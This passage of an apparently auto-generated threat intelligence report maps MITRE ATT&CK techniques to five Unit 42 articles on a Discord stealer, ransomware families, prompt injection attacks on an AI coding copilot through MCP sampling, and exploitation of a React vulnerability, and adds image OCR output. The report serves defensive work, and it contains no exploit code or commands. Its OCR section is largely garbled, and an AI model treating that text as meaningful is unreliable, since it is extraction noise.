| T1059.007: JavaScript | [1](https://unit42.paloaltonetworks.com/vvs-stealer/), [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1062: Hypervisor | [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/) |
| T1070.004: File Deletion | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1070: Indicator Removal | [3](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/) |
| T1085: Rundll32 | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1086: PowerShell | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1100: Web Shell | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1107: File Deletion | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1204.002: Malicious File | [4](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) |
| T1218.011: Rundll32 | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1505.003: Web Shell | [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1566: Phishing | [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/) |
| T1583.006: Web Services | [4](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) |
| T1584.006: Web Services | [4](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) |
| T1587.004: Exploits | [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/), [3](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/), [4](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) |
| T1588.005: Exploits | [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/), [3](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/), [4](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) |
| T1588.006: Vulnerabilities | [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/), [3](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/), [4](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/), [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1589.001: Credentials | [1](https://unit42.paloaltonetworks.com/vvs-stealer/), [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |
| T1592.002: Software | [1](https://unit42.paloaltonetworks.com/vvs-stealer/), [2](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/), [3](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/), [5](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/) |

## 📄 Source Details

> Expand each source for detailed information extracted from that article.

<details>
<summary><strong>Source 1: VVS Discord Stealer Using Pyarmor for Obfuscation and Detection Evasion</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/vvs-stealer/

**IOCs from this source:** 19<br>
**MITRE techniques:** 3

**Excerpt:**
> Executive Summary This article details our technical analysis of VVS stealer, also styled VVS $tealer, including its distributors’ use of obfuscation and detection evasion. The stealer is written in Python and targets Discord users, exfiltrating sensitive information like credentials and tokens stored in Discord accounts. This stealer was once in active development and marketed for sale on Telegram as early as April 2025. VVS stealer's code is obfuscated by Pyarmor . This tool is used to obfusca...

</details>

<details>
<summary><strong>Source 2: From Linear to Complex: An Upgrade in RansomHouse Encryption</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/

**IOCs from this source:** 5<br>
**MITRE techniques:** 7

**Excerpt:**
> Executive Summary RansomHouse is a ransomware-as-a-service (RaaS) operation run by a group that we track as Jolly Scorpius. Recent samples of the associated binaries used in RansomHouse operations reveal a significant upgrade in encryption. This article explores the upgrade of RansomHouse encryption and the potential impact for defenders. Jolly Scorpius uses a double extortion strategy. This strategy combines stealing and encrypting a victim's data with threats to leak the stolen data. The scale...

</details>

<details>
<summary><strong>Source 3: 01flip: Multi-Platform Ransomware Written in Rust</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/

**IOCs from this source:** 7<br>
**MITRE techniques:** 5

**Excerpt:**
> Executive Summary In June 2025, we observed a new ransomware family named 01flip targeting a limited set of victims in the Asia-Pacific region. 01flip ransomware is fully written in the Rust programming language and supports multi-platform architectures by leveraging the cross-compilation feature of Rust. These financially motivated attackers likely carried this out through manual means. We have confirmed an alleged data leak from an affected organization on a dark web forum shortly after the at...

</details>

<details>
<summary><strong>Source 4: New Prompt Injection Attack Vectors Through MCP Sampling</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/

**IOCs from this source:** 2<br>
**MITRE techniques:** 6

**Excerpt:**
> Executive Summary This article examines the security implications of the Model Context Protocol (MCP) sampling feature in the context of a widely used coding copilot application. MCP is a standard for connecting large language model (LLM) applications to external data sources and tools. We show that, without proper safeguards, malicious MCP servers can exploit the sampling feature for a range of attacks. We demonstrate these risks in practice through three proof-of-concept (PoC) examples conduct...

</details>

<details>
<summary><strong>Source 5: Exploitation of Critical Vulnerability in React Server Components (Updated December 12)</strong></summary>

**URL:** https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/

**IOCs from this source:** 138<br>
**MITRE techniques:** 13

**Excerpt:**
> Executive Summary Update Dec. 12, 2025 Unit 42 uncovered the previously unseen KSwapDoor. This Linux backdoor was initially mistaken for BPFDoor. Key features include: P2P mesh network: Enables multi-hop routing for robust C2 communications Strong encryption: Uses AES-256-CFB with Diffie-Hellman key exchange Stealth and persistence: Mimics a legitimate Linux kernel swap daemon Full remote access: Offers an interactive shell, command execution, file operations and lateral movement scanning Update...

</details>

## 🔍 OCR Extracted Content

> Images extracted from source documents with OCR text. Click to expand each image.

<details>
<summary><strong>Image 1</strong> from vvs-stealer</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

<details>
<summary><strong>Image 8</strong> from vvs-stealer</summary>

**View Image:** [url_img_036_58c9b3604262.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_036_58c9b3604262.jpg)

**Extracted Text:**
> ee oe olan," tee sees” bine 2904 2 SP iam OE at bias,  i  i eka

</details>

<details>
<summary><strong>Image 11</strong> from vvs-stealer</summary>

**View Image:** [url_img_045_30d6fae6a658.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_045_30d6fae6a658.jpg)

**Extracted Text:**
> 01 :d008% so

</details>

<details>
<summary><strong>Image 13</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

<details>
<summary><strong>Image 16</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_031_2f7d32ab52f5.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_031_2f7d32ab52f5.png)

**Extracted Text:**
> ) , Y >»,

</details>

<details>
<summary><strong>Image 18</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_034_dca2be9dcf5e.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_034_dca2be9dcf5e.png)

**Extracted Text:**
> KC

</details>

<details>
<summary><strong>Image 23</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_043_1d5049a134ae.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_043_1d5049a134ae.jpg)

**Extracted Text:**
> Ru  o. OE)  /. 4

</details>

<details>
<summary><strong>Image 25</strong> from ransomhouse-encryption-upgrade</summary>

**View Image:** [url_img_046_41f78ae601a6.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_046_41f78ae601a6.png)

**Extracted Text:**
> AN  ww

</details>

<details>
<summary><strong>Image 29</strong> from new-ransomware-01flip-written-in-rust</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

<details>
<summary><strong>Image 32</strong> from new-ransomware-01flip-written-in-rust</summary>

**View Image:** [url_img_032_58c9b3604262.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_032_58c9b3604262.jpg)

**Extracted Text:**
> ee oe olan," tee sees” bine 2904 2 SP iam OE at bias,  i  i eka

</details>

<details>
<summary><strong>Image 34</strong> from new-ransomware-01flip-written-in-rust</summary>

**View Image:** [url_img_038_2f7d32ab52f5.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_038_2f7d32ab52f5.png)

**Extracted Text:**
> ) , Y >»,

</details>

<details>
<summary><strong>Image 36</strong> from new-ransomware-01flip-written-in-rust</summary>

**View Image:** [url_img_041_dca2be9dcf5e.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_041_dca2be9dcf5e.png)

**Extracted Text:**
> KC

</details>

<details>
<summary><strong>Image 39</strong> from new-ransomware-01flip-written-in-rust</summary>

**View Image:** [url_img_047_c8e6ff1997d9.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_047_c8e6ff1997d9.jpg)

**Extracted Text:**
> -yoerspace , myst 796" 78534  Daa” isSuosee24 53 GWBBAZ4IB39TAZG2425 4/1 8  6 cen BeNOR ads 3463793,   cr46 1454,  4645) +? Of a0 04534 K200505 W2S025  ae 7  i 749 7TS7469 Uc, i He804254 i.

</details>

<details>
<summary><strong>Image 42</strong> from model-context-protocol-attack-vectors</summary>

**View Image:** [url_img_001_8ec11303a508.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_8ec11303a508.png)

**Extracted Text:**
> %

</details>

<details>
<summary><strong>Image 49</strong> from model-context-protocol-attack-vectors</summary>

**View Image:** [url_img_034_58c9b3604262.jpg](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_034_58c9b3604262.jpg)

**Extracted Text:**
> ee oe olan," tee sees” bine 2904 2 SP iam OE at bias,  i  i eka

</details>

**OCR Summary:** 17 images processed with text extracted

---

*Generated by PEAK CTI v3.0 Multi-Source Consolidated Report*
*2026-01-06 20:23:01 UTC*